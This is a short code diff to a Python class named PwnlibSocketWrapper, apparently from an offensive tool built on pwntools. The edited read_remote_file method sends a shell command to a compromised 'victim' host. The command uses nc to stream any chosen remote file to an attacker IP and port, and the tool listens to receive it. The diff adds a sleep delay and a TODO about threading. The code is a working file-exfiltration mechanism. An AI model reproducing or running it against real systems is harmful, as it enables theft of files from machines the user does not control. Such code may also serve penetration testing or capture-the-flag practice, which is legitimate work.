@@ -41,10 +41,11 @@ class PwnlibSocketWrapper:
 
         return output_remote_temporary_file
 
-    def read_remote_file(self, remote_path: str) -> str:
-        download_command = f'nc -w 3 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
+    def read_remote_file(self, remote_path: str, wait_before_upload_seconds: int=3) -> str:
+        download_command = f'sleep {wait_before_upload_seconds} && nc -w 3 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
         self.client.sendline(download_command)
 
+        # TODO: run listen on separate thread before running nc on victim
         downloaded_output = None
         with pwn.listen(self.netcat_file_transfer_port).wait_for_connection() as client:
             downloaded_output = client.recvall().strip()
